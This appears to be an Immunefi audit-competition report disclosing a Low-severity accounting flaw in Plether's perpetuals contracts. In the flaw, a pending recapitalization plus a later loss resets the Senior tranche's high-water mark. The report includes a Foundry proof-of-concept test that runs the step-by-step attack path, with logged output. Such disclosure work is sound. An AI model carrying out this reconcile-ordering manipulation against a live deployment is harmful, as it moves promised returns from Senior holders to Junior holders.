# \#98707 [SC-Low] a pending recapitalization backs new trading exposure but is held out of the tranche waterfall, so a loss on that exposure zeroes an impaired Senior and the bootstrap branch resets the Senior high-water mark

**Submitted on Nov 9th 2026 at 17:53:30 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98707
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

when the owner recapitalizes an impaired pool, the cash is added to `pool.totalAssets()` immediately, which raises trading depth and admits new positions, but the amount waits as a pending bucket until the next reconcile. at that reconcile, the pending recap is held out of what the tranches see, so a loss on the exposure the recap enabled is charged entirely to the remaining Senior principal. once Senior and Junior are both zero, the recap is applied through the empty-waterfall bootstrap branch, which overwrites the Senior high-water mark with the recap amount.

Senior loses the restoration priority it had before the recap. the protocol specifies that losses do not reduce the Senior high-water mark and that surplus restores Senior to it before Junior earns anything. in the PoC, Senior's high-water mark drops from 190_002.74 USDG to exactly 100_000 USDG, the following revenue goes to Junior, and Senior ends 6_676.86 USDG lower than with the same trades settled in the other order.

## Vulnerability Details

`CfdEngine.recapitalizePool` transfers the cash to the pool and records it as a claimant inflow. the pool counts the cash in `accountedAssets` at once, and only queues the recap ownership:

```solidity
        if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
@>          accountedAssets += amount;
        }

        if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
@>          _recordPendingClaimantInflow(kind, amount);
```

order execution reads trading depth straight from `pool.totalAssets()`, so the recap cash raises the skew cap for new opens right away:

```solidity
@>      request.poolDepthAssets = IHousePool(engine_.pool()).totalAssets();
```

at the next reconcile, the pending buckets are subtracted from distributable equity before the waterfall runs, so the recap cash cannot absorb any loss:

```solidity
        if (pendingBucketAssets > 0) {
@>          snapshot.distributable =
                snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
        }
```

any loss on the recap-enabled exposure is then charged to Junior, then Senior. once both are zero, the pending recap is applied, and with Senior supply outstanding and zero claimed principal it takes the bootstrap branch:

```solidity
        if (state.seniorSupply > 0) {
@>          if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
                state.waterfall.seniorPrincipal += remaining;
@>              state.waterfall.seniorHighWaterMark =
                    recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```

the stored high-water mark is replaced with `max(recap target, amount)`, and the Senior entitlement above it disappears. ACCOUNTING_SPEC.md states the opposite rule: "Losses do not reduce the Senior high-water mark" and "Route surplus first to restore Senior principal to its high-water mark, then to Junior".

the bootstrap branch is documented for a pool with zero claimed principal when the recap is applied. here Senior was still funded when the owner recapitalized. it reaches zero only because the recap's own cash admitted new exposure, and that exposure's loss is settled in the same reconcile that applies the recap. the outcome depends only on reconcile timing. with identical trades, prices and cash, a reconcile right after the recap keeps the high-water mark at its old value, and a reconcile after the loss resets it.

the window between the recap and the first reconcile is structural. `settleLpEpoch` reverts when there is no matured LP epoch work:

```solidity
        if (result.seniorProcessedEpochs == 0 && result.juniorProcessedEpochs == 0 && depositProcessedEpochs == 0) {
@>          revert HousePool__NoLpEpochProgress();
        }
```

and the owner's `assignUnassignedAssets` reconciles but reverts with `HousePool__NoUnassignedAssets` when there is nothing unassigned. so after a recap, no one can reconcile until an LP request matures, while trading against the new depth is live. a wiped Junior holder (the party that benefits from the reset) can provide that LP work with a full redeem request, which is refunded at zero NAV and counts as epoch progress.

the reset applies to a pool in exactly the state the recapitalization exists for: trader gains have wiped Junior and impaired Senior far enough that a loss on the recap-enabled exposure exceeds the remaining Senior principal before the first reconcile.

attack path, starting from that state (Junior is 0, Senior principal `s` > 0, high-water mark `H_old`):

1. the owner calls `CfdEngine.recapitalizePool(X)` with `X < H_old`, the documented recovery action. Senior principal and the high-water mark are unchanged, and `X` sits in `pendingRecapitalizationAssets`.
2. a trader opens a position sized to the recap-enabled capacity. the same open is rejected with `SKEW_TOO_HIGH` before the recap and admitted after it.
3. the price moves against the pool so the loss is at least `s`. no reconcile has run, because `settleLpEpoch` reverts `HousePool__NoLpEpochProgress`.
4. a wiped Junior holder requests a full redeem. once it matures, anyone calls `settleLpEpoch`.
5. in that reconcile the loss zeroes Senior, the bootstrap branch runs, and the Senior high-water mark becomes `X`. the pool stays solvent (no terminal deficit, not degraded).
6. later surplus restores Senior only up to `X`. everything above goes to Junior.

measured at release parameters (settlementBufferBps 25, executionFeeBps 4, vpiFactor 0.01, maxSkewRatio 0.4):

| quantity | attack (settle after the loss) | control (settle right after the recap) |
| --- | --- | --- |
| Senior principal `s` and high-water mark before the recap | 2_758.13 and 190_002.74 | 2_758.13 and 190_002.74 |
| recap `X` | 100_000 | 100_000 |
| recap-enabled long notional | 40_075.67 | 40_075.67 |
| after the loss settle: Senior, Junior, high-water mark | 98_835.98, 0, 100_000.00 | 98_835.98, 0, 190_002.74 |
| after later revenue: Senior, Junior, unassigned | 99_996.91, 5_512.84, 1_164.02 | 106_673.77, 0, 0 |
| Senior high-water mark at the end | 99_996.91 | 189_995.48 |

## Impact Details

1. Senior loses its restoration priority. the high-water mark drops from 190_002.74 USDG to 100_000 USDG, so up to 90_002.74 USDG of future surplus that the waterfall owes to Senior is routed to Junior instead.
2. in the PoC, the same 7_837.79 USDG of later revenue arrives in both orderings. in the control it all restores Senior (106_673.77 USDG at the end). after the reset, Senior ends at 99_996.91 USDG and Junior, which had been wiped, holds 5_512.84 USDG. Senior is 6_676.86 USDG worse off, and every further surplus keeps going to Junior until the next loss.
3. the only privileged step is the owner's documented recapitalization. every other step is an ordinary trade, an ordinary LP request or a permissionless `settleLpEpoch`, and the beneficiaries (wiped Junior holders) can supply the LP request that triggers the deciding reconcile.

this maps to the in-scope Low impact "Contract fails to deliver promised returns, but doesn't lose value": Senior holders do not receive the restoration to their high-water mark that the accounting spec promises. in the PoC they end 6_676.86 USDG below the control, and that amount is paid to Junior instead.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L651

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L645

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L933

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L953

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L473-L479

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1183-L1185

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L671-L676

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L337-L338

## Proof of Concept

## Proof of Concept

the test deploys the repo contracts through the suite's `BasePerpTest` with the release parameters (asserted in `setUp`), and mocks only Pyth (`MockPyth`) and USDG (`MockSettlementToken`). trades use the suite's `_open` / `_close` helpers, which run the real `CfdEngine.processOrderTyped` planner with its skew, solvency and margin checks against `pool.totalAssets()` depth. every reconcile is the permissionless `OrderRouter.settleLpEpoch`. the impaired Senior state is built through repeated trader wins before the recap.

`test_lossAfterPendingRecap_resetsSeniorHwm` is the attack ordering, `test_control_settleBeforeLoss_keepsSeniorHwm` settles right after the recap, and `test_orderingDependence_sideBySide` runs both from one snapshot and compares them.

create `packages/perps/test/perps/poc/RecapHwmReset.t.sol` with this content:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @title a pending recapitalization lets a later same-pass loss zero a still-funded Senior, so the
///        empty-waterfall bootstrap branch (HousePoolPendingPreviewLib.sol:117-122) resets the Senior HWM to X.
/// @dev Local deploy of the repo contracts at a82d4fef with release parameters (DEPLOYMENT.md:126-165).
///      Trades go through the real CfdEngine.processOrderTyped planner/solvency gate via the suite's router-pranked
///      helpers (BasePerpTest._open/_close, the same depth source as OrderRouterExecutionSidecar.sol:933,953).
///      Every reconcile is the permissionless production OrderRouter.settleLpEpoch with a MockPyth update.
contract RecapHwmResetTest is BasePerpTest {

    address internal constant JUNIOR_LP = address(0xA11CE);
    address internal constant JUNIOR_LP2 = address(0xA11CE2);
    address internal constant JUNIOR_LP3 = address(0xA11CE3);
    address internal constant SENIOR_LP = address(0xB0B);
    address internal constant TRADER_A = address(0x7A01);
    address internal constant TRADER_B = address(0x7B01);
    address internal constant TRADER_C = address(0x7C01);
    address internal constant KEEPER = address(0x4EE9);

    uint256 internal constant JUNIOR_DEPOSIT = 50_000e6;
    uint256 internal constant SENIOR_DEPOSIT = 190_000e6;
    uint256 internal constant RECAP_X = 100_000e6;

    uint256 internal constant P_HIGH = 1e8;
    uint256 internal constant P_LOW = 0.9e8;

    uint256 internal px;

    struct Snap {
        uint256 senior;
        uint256 junior;
        uint256 hwm;
        uint256 unassigned;
        uint256 pendingRecap;
        uint256 poolAssets;
        uint256 deficit;
        bool degraded;
    }

    struct Branch {
        Snap afterRecap;
        Snap afterLossSettle;
        Snap afterRevenue1;
        Snap afterRevenue2;
        uint256 postResetRevenue;
    }

    // ---------------------------------------------------------------------
    // Release parameters (DEPLOYMENT.md:130-165)
    // ---------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior cap: 40M USDG and 80% of the pool (DEPLOYMENT.md:160-161).
        _setSeniorCapacity(40_000_000e6, 8000);

        assertEq(engine.settlementBufferBps(), 25, "release settlementBufferBps");
        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozenCloseSpreadBps");
        assertEq(pool.maxSeniorShareBps(), 8000, "release maxSeniorShareBps");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release maxSeniorExposureAssets");

        // Ordinary LPs fund both tranches through the async vault flow.
        _fundJunior(JUNIOR_LP, JUNIOR_DEPOSIT - 2_000e6);
        _fundJunior(JUNIOR_LP2, 1_000e6);
        _fundJunior(JUNIOR_LP3, 1_000e6);
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);

        _fundTrader(TRADER_A, 50_000e6);
        _fundTrader(TRADER_B, 50_000e6);
        _fundTrader(TRADER_C, 50_000e6);
        px = P_HIGH;
    }

    // ---------------------------------------------------------------------
    // Tests
    // ---------------------------------------------------------------------

    /// @notice Attack ordering: recap -> recap-backed open -> loss -> one settle. HWM is reset to X.
    function test_lossAfterPendingRecap_resetsSeniorHwm() public {
        (uint256 hOld, uint256 s) = _stage1_impairSenior();
        Branch memory b = _runBranch(false, hOld, s);
        _assertAttack(b, hOld);
    }

    /// @notice Negative control: identical flow, but an honest settleLpEpoch runs right after the recap.
    function test_control_settleBeforeLoss_keepsSeniorHwm() public {
        (uint256 hOld, uint256 s) = _stage1_impairSenior();
        Branch memory c = _runBranch(true, hOld, s);
        _assertControl(c, hOld);
    }

    /// @notice Side-by-side from the same impaired state: only the settle ordering differs.
    function test_orderingDependence_sideBySide() public {
        (uint256 hOld, uint256 s) = _stage1_impairSenior();
        uint256 snapshotId = vm.snapshotState();
        Branch memory attack = _runBranch(false, hOld, s);
        vm.revertToState(snapshotId);
        Branch memory control = _runBranch(true, hOld, s);

        _assertAttack(attack, hOld);
        _assertControl(control, hOld);

        // Same trades, same cash: the economic end state is identical, only its split differs.
        uint256 attackTotal = attack.afterRevenue2.senior + attack.afterRevenue2.junior + attack.afterRevenue2.unassigned
            + attack.afterRevenue2.pendingRecap;
        uint256 controlTotal = control.afterRevenue2.senior + control.afterRevenue2.junior
            + control.afterRevenue2.unassigned + control.afterRevenue2.pendingRecap;
        assertApproxEqAbs(attackTotal, controlTotal, 50e6, "both orderings end with the same claimable LP value");
        assertGt(
            control.afterRevenue2.senior,
            attack.afterRevenue2.senior,
            "honest ordering leaves Senior with more principal after the same revenue"
        );
        assertGt(
            attack.afterRevenue2.junior,
            control.afterRevenue2.junior,
            "attack ordering hands the post-reset revenue to Junior"
        );

        console2.log("=== side-by-side (6-dec USDG) ===");
        console2.log("senior  attack / control", attack.afterRevenue2.senior, control.afterRevenue2.senior);
        console2.log("junior  attack / control", attack.afterRevenue2.junior, control.afterRevenue2.junior);
        console2.log("unassig attack / control", attack.afterRevenue2.unassigned, control.afterRevenue2.unassigned);
        console2.log("HWM     attack / control", attack.afterRevenue2.hwm, control.afterRevenue2.hwm);
        console2.log(
            "Senior priority lost (control.senior - attack.senior)",
            control.afterRevenue2.senior - attack.afterRevenue2.senior
        );
    }

    // ---------------------------------------------------------------------
    // Stage 1: honest trader wins impair Senior (J = 0, 0 < S = s < HWM = H_old)
    // ---------------------------------------------------------------------

    function _stage1_impairSenior() internal returns (uint256 hOld, uint256 s) {
        Snap memory start = _snap();
        console2.log("=== stage 0: funded pool ===");
        _logSnap(start);

        bool longTurn = true;
        uint256 rounds;
        while (rounds < 600) {
            uint256 notional = (pool.totalAssets() * 39) / 100;
            if (notional < 1_100e6) {
                break;
            }
            if (longTurn) {
                // basket falls 10%: LONG wins (CfdMath.sol:61-72)
                _traderWinRound(TRADER_A, CfdTypes.Side.LONG, P_HIGH, P_LOW, notional);
            } else {
                // basket recovers 11.1%: SHORT wins
                _traderWinRound(TRADER_B, CfdTypes.Side.SHORT, P_LOW, P_HIGH, notional);
            }
            longTurn = !longTurn;
            ++rounds;
        }
        // settleLpEpoch needs matured LP work (HousePool.sol:1183-1184). A wiped Junior holder's full redeem request
        // is refunded at zero NAV (HousePool.sol:957-986), so it lets the keeper reconcile without moving principal.
        _matureJuniorRefundRequest(JUNIOR_LP);
        _keeperSettle(px);

        Snap memory impaired = _snap();
        console2.log("=== stage 1: Senior impaired by trader wins; rounds =", rounds);
        _logSnap(impaired);

        assertEq(impaired.junior, 0, "Junior wiped first");
        assertGt(impaired.senior, 0, "Senior still funded (s > 0)");
        assertLt(impaired.senior, impaired.hwm, "Senior impaired: s < H_old");
        assertFalse(impaired.degraded, "ordinary impairment, not degraded");
        assertEq(impaired.deficit, 0, "no terminal deficit");
        assertEq(engine.settlementBufferBps(), 25, "release buffer still in force");
        hOld = impaired.hwm;
        s = impaired.senior;
    }

    // ---------------------------------------------------------------------
    // Stages 2-5
    // ---------------------------------------------------------------------

    function _runBranch(
        bool honestSettleAfterRecap,
        uint256 hOld,
        uint256 s
    ) internal returns (Branch memory b) {
        console2.log(honestSettleAfterRecap ? "##### CONTROL branch #####" : "##### ATTACK branch #####");
        uint256 openPrice = px;
        uint256 lossPrice = (openPrice * 90) / 100;

        // Stage 3 precheck: the same open is rejected without the recap.
        uint256 recapNotional = ((pool.totalAssets() + RECAP_X) * 39) / 100;
        uint256 recapSize = _sizeFor(recapNotional, openPrice);
        _tick();
        (bool okBefore, bytes memory errBefore) =
            _tryOpen(TRADER_C, CfdTypes.Side.LONG, recapSize, recapNotional / 10, openPrice);
        assertFalse(okBefore, "open of recap-sized exposure must be rejected before the recap");
        console2.log("pre-recap open rejected; selector:");
        console2.logBytes(errBefore);

        if (honestSettleAfterRecap) {
            // Control: some LP request is already matured when the recap lands, so a keeper can settle at once.
            _matureJuniorRefundRequest(JUNIOR_LP2);
        }

        // Stage 2: owner performs the documented recovery action with X < H_old (CfdEngine.sol:632-651).
        assertLt(RECAP_X, hOld, "partial recap X < H_old");
        settlementToken.mint(address(this), RECAP_X);
        settlementToken.approve(address(engine), RECAP_X);
        engine.recapitalizePool(RECAP_X);
        assertEq(pool.pendingRecapitalizationAssets(), RECAP_X, "recap only queues; no reconcile");
        assertEq(pool.seniorPrincipal(), s, "recap call does not touch principal");
        assertEq(pool.seniorHighWaterMark(), hOld, "recap call does not touch HWM");
        b.afterRecap = _snap();

        if (honestSettleAfterRecap) {
            _keeperSettle(openPrice);
            console2.log("control: keeper settles right after recap");
            _logSnap(_snap());
            assertEq(pool.seniorHighWaterMark(), hOld, "control: HWM untouched by the else-branch recap");
            assertEq(pool.seniorPrincipal(), s + RECAP_X, "control: recap restores S toward H_old");
        } else {
            // Attack ordering: with no matured LP request, nobody can reconcile right after the recap.
            bytes[] memory data = _mockPythUpdateData(openPrice);
            vm.prank(KEEPER);
            (bool settled, bytes memory settleErr) =
                address(router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", data));
            assertFalse(settled, "no reconcile possible before the next matured LP request");
            console2.log("attack: immediate keeper settle reverted; selector:");
            console2.logBytes4(_selectorOf(settleErr));
            assertEq(pool.pendingRecapitalizationAssets(), RECAP_X, "recap still pending");
        }

        // Stage 3: an ordinary trader opens exposure that only the recap cash admits.
        _tick();
        (bool okAfter, bytes memory errAfter) =
            _tryOpen(TRADER_C, CfdTypes.Side.LONG, recapSize, recapNotional / 10, openPrice);
        if (!okAfter) {
            console2.logBytes4(_selectorOf(errAfter));
        }
        assertTrue(okAfter, "recap-backed open admitted");
        console2.log("recap-backed LONG notional opened:", recapNotional);

        // Stage 4: basket falls 10% within the epoch; the next matured LP request lets a keeper settle at the new mark.
        _matureJuniorRefundRequest(JUNIOR_LP3);
        _keeperSettle(lossPrice);
        px = lossPrice;
        b.afterLossSettle = _snap();
        console2.log("=== after loss settle ===");
        _logSnap(b.afterLossSettle);
        assertFalse(b.afterLossSettle.degraded, "pool stays solvent / not degraded");
        assertEq(b.afterLossSettle.deficit, 0, "no terminal deficit");

        // Stage 5: post-reset revenue. Revenue 1: basket returns to the open price and the trader closes flat.
        _tick();
        _close(TRADER_C, CfdTypes.Side.LONG, recapSize, openPrice);
        px = openPrice;
        _matureSeniorDustRequest();
        _keeperSettle(openPrice);
        b.afterRevenue1 = _snap();
        console2.log("=== after revenue 1 (price reverts, trader closes) ===");
        _logSnap(b.afterRevenue1);

        // Revenue 2: a SHORT trader loses 10% on a fresh position.
        uint256 shortNotional = (pool.totalAssets() * 39) / 100;
        uint256 shortSize = _sizeFor(shortNotional, openPrice);
        _tick();
        _open(TRADER_B, CfdTypes.Side.SHORT, shortSize, shortNotional / 10, openPrice);
        _tick();
        _close(TRADER_B, CfdTypes.Side.SHORT, shortSize, lossPrice);
        px = lossPrice;
        _matureSeniorDustRequest();
        _keeperSettle(lossPrice);
        b.afterRevenue2 = _snap();
        console2.log("=== after revenue 2 (short trader loses) ===");
        _logSnap(b.afterRevenue2);

        uint256 totalAfterLoss = b.afterLossSettle.senior + b.afterLossSettle.junior + b.afterLossSettle.unassigned
            + b.afterLossSettle.pendingRecap;
        uint256 totalEnd = b.afterRevenue2.senior + b.afterRevenue2.junior + b.afterRevenue2.unassigned
            + b.afterRevenue2.pendingRecap;
        b.postResetRevenue = totalEnd > totalAfterLoss ? totalEnd - totalAfterLoss : 0;
        console2.log("post-loss value routed to S+J+unassigned+pending (net of dust redemptions):", b.postResetRevenue);
    }

    function _assertAttack(
        Branch memory b,
        uint256 hOld
    ) internal pure {
        // Loss + pending recap applied in one reconcile: S and J were zeroed, and the bootstrap branch set HWM = X.
        assertEq(b.afterLossSettle.junior, 0, "attack: J = 0");
        assertEq(b.afterLossSettle.hwm, RECAP_X, "attack: bootstrap branch set HWM = max(X, d) = X");
        assertLt(b.afterLossSettle.hwm, hOld, "attack: HWM lowered below H_old");
        assertLt(b.afterLossSettle.senior, RECAP_X, "attack: Senior ends at d < X");
        assertEq(
            b.afterLossSettle.senior + b.afterLossSettle.pendingRecap,
            RECAP_X,
            "attack: S = d (settleable amount) and X - d stays pending"
        );
        // Consequence: Senior is capped at X; the rest of the later revenue goes to Junior.
        // Tolerance covers the ~2 USDG Senior dust redemptions used to give the keeper matured LP work
        // (scaleSeniorOnWithdraw, HousePoolWaterfallAccountingLib.sol:121-131) and the Junior-funded coupon (:65-91).
        assertApproxEqAbs(b.afterRevenue2.hwm, RECAP_X, 20e6, "attack: HWM stays at ~X");
        assertApproxEqAbs(b.afterRevenue2.senior, RECAP_X, 20e6, "attack: Senior restored only to ~X, far below H_old");
        assertLt(b.afterRevenue2.senior + 50_000e6, hOld, "attack: Senior far below H_old");
        assertGt(b.afterRevenue2.junior, 0, "attack: Junior receives post-reset revenue while Senior < H_old");
    }

    function _assertControl(
        Branch memory c,
        uint256 hOld
    ) internal pure {
        assertEq(c.afterLossSettle.hwm, hOld, "control: HWM stays H_old");
        assertApproxEqAbs(c.afterRevenue2.hwm, hOld, 20e6, "control: HWM stays ~H_old after revenue (dust scaling)");
        assertEq(c.afterRevenue2.junior, 0, "control: all revenue restores Senior first");
        assertLt(c.afterRevenue2.senior, hOld, "control: Senior still below H_old, priority preserved");
        assertGt(c.afterRevenue2.senior, RECAP_X, "control: Senior restored past X toward H_old");
    }

    // ---------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------

    function _matureJuniorRefundRequest(
        address lp
    ) internal {
        uint256 cooldownEnd = juniorVault.lastDepositTime(lp) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        assertGt(shares, 0, "junior holder has shares to request");
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        _warpTo(pool.lpEpochStart(requestId));
    }

    function _matureSeniorDustRequest() internal {
        uint256 balance = seniorVault.balanceOf(SENIOR_LP);
        uint256 value = seniorVault.estimateRedeemAssets(balance);
        uint256 shares = (balance * 2e6) / value + 1;
        vm.prank(SENIOR_LP);
        uint256 requestId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
        _warpTo(pool.lpEpochStart(requestId));
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) {
            vm.warp(t);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _sizeFor(
        uint256 notionalAssets,
        uint256 price
    ) internal pure returns (uint256 size) {
        size = ((notionalAssets * 1e20) / price / 1e20) * 1e20;
    }

    function _traderWinRound(
        address trader,
        CfdTypes.Side side,
        uint256 entry,
        uint256 exit,
        uint256 notional
    ) internal {
        uint256 size = _sizeFor(notional, entry);
        _tick();
        _open(trader, side, size, notional / 10, entry);
        _tick();
        _close(trader, side, size, exit);
        px = exit;
    }

    function _tryOpen(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal returns (bool ok, bytes memory err) {
        CfdTypes.Order memory order = CfdTypes.Order({
            account: account,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: price,
            commitTime: uint64(vm.getBlockTimestamp()),
            commitBlock: uint64(vm.getBlockNumber()),
            orderId: 0,
            side: side,
            isClose: false
        });
        uint256 depth = pool.totalAssets();
        vm.prank(address(router));
        (ok, err) = address(engine).call(
            abi.encodeCall(CfdEngine.processOrderTyped, (order, price, depth, uint64(vm.getBlockTimestamp())))
        );
    }

    function _selectorOf(
        bytes memory err
    ) internal pure returns (bytes4 sel) {
        if (err.length >= 4) {
            assembly ("memory-safe") {
                sel := mload(add(err, 32))
            }
        }
    }

    /// @dev Permissionless production path: OrderRouter.settleLpEpoch (OrderRouter.sol:479-484).
    function _keeperSettle(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _snap() internal view returns (Snap memory s) {
        s.senior = pool.seniorPrincipal();
        s.junior = pool.juniorPrincipal();
        s.hwm = pool.seniorHighWaterMark();
        s.unassigned = pool.unassignedAssets();
        s.pendingRecap = pool.pendingRecapitalizationAssets();
        s.poolAssets = pool.totalAssets();
        s.deficit = pool.terminalDeficitAssets();
        s.degraded = engine.degradedMode();
    }

    function _logSnap(
        Snap memory s
    ) internal pure {
        console2.log("  seniorPrincipal      ", s.senior);
        console2.log("  juniorPrincipal      ", s.junior);
        console2.log("  seniorHighWaterMark  ", s.hwm);
        console2.log("  unassignedAssets     ", s.unassigned);
        console2.log("  pendingRecap         ", s.pendingRecap);
        console2.log("  pool.totalAssets     ", s.poolAssets);
        console2.log("  terminalDeficit      ", s.deficit);
        console2.log("  degradedMode         ", s.degraded);
    }

}
```

run it from `packages/perps`:

```bash
forge test --match-path test/perps/poc/RecapHwmReset.t.sol --match-test test_orderingDependence_sideBySide -vv
```

output:

```bash
[PASS] test_orderingDependence_sideBySide() (gas: 108932872)
Ran 1 test for test/perps/poc/RecapHwmReset.t.sol:RecapHwmResetTest
Logs:
  === stage 0: funded pool ===
    seniorPrincipal       190001000693
    juniorPrincipal       50000999307
    seniorHighWaterMark   190001000693
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      240002000000
    terminalDeficit       0
    degradedMode          false
  === stage 1: Senior impaired by trader wins; rounds = 108
    seniorPrincipal       2758129371
    juniorPrincipal       0
    seniorHighWaterMark   190002736343
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      2758129371
    terminalDeficit       0
    degradedMode          false
  ##### ATTACK branch #####
  pre-recap open rejected; selector:
  0x7a004a8a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000
  attack: immediate keeper settle reverted; selector:
  0x86cca6b8
  recap-backed LONG notional opened: 40075670454
  === after loss settle ===
    seniorPrincipal       98835982092
    juniorPrincipal       0
    seniorHighWaterMark   100000000000
    unassignedAssets      0
    pendingRecap          1164017908
    pool.totalAssets      102835982092
    terminalDeficit       0
    degradedMode          false
  === after revenue 1 (price reverts, trader closes) ===
    seniorPrincipal       99998000000
    juniorPrincipal       1610242854
    seniorHighWaterMark   99998000000
    unassignedAssets      1164017908
    pendingRecap          0
    pool.totalAssets      102772260762
    terminalDeficit       0
    degradedMode          false
  === after revenue 2 (short trader loses) ===
    seniorPrincipal       99996913205
    juniorPrincipal       5512843488
    seniorHighWaterMark   99996913205
    unassignedAssets      1164017908
    pendingRecap          0
    pool.totalAssets      106673774601
    terminalDeficit       0
    degradedMode          false
  post-loss value routed to S+J+unassigned+pending (net of dust redemptions): 6673774601
  ##### CONTROL branch #####
  pre-recap open rejected; selector:
  0x7a004a8a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000
  control: keeper settles right after recap
    seniorPrincipal       102758129371
    juniorPrincipal       0
    seniorHighWaterMark   190002736343
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      102758129371
    terminalDeficit       0
    degradedMode          false
  recap-backed LONG notional opened: 40075670454
  === after loss settle ===
    seniorPrincipal       98835982092
    juniorPrincipal       0
    seniorHighWaterMark   190002736343
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      102835982092
    terminalDeficit       0
    degradedMode          false
  === after revenue 1 (price reverts, trader closes) ===
    seniorPrincipal       102772260803
    juniorPrincipal       0
    seniorHighWaterMark   189999038866
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      102772260803
    terminalDeficit       0
    degradedMode          false
  === after revenue 2 (short trader loses) ===
    seniorPrincipal       106673774662
    juniorPrincipal       0
    seniorHighWaterMark   189995476689
    unassignedAssets      0
    pendingRecap          0
    pool.totalAssets      106673774662
    terminalDeficit       0
    degradedMode          false
  post-loss value routed to S+J+unassigned+pending (net of dust redemptions): 7837792570
  === side-by-side (6-dec USDG) ===
  senior  attack / control 99996913205 106673774662
  junior  attack / control 5512843488 0
  unassig attack / control 1164017908 0
  HWM     attack / control 99996913205 189995476689
  Senior priority lost (control.senior - attack.senior) 6676861457

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

